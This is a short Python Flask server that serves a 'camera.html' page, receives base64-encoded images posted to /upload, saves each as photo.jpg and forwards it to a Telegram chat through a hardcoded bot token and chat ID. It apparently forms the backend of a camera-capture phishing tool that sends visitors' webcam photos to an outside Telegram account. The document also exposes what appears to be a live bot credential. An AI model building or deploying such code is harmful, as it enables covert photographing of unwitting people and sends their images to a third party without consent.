from flask import Flask, request
import requests
import base64

TOKEN = "8657563336:AAHa03MTTZ2ZuHk8bx5ESYkcJsLaW0gdB-w"
CHAT_ID = "1064122583"

app = Flask(__name__)

@app.route("/")
def index():
    return open("camera.html").read()

@app.route("/upload", methods=["POST"])
def upload():
    data = request.data.decode().split(",")[1]
    img = base64.b64decode(data)

    with open("photo.jpg", "wb") as f:
        f.write(img)

    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"

    requests.post(
        url,
        data={"chat_id": CHAT_ID},
        files={"photo": open("photo.jpg", "rb")}
    )

    return "sent"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
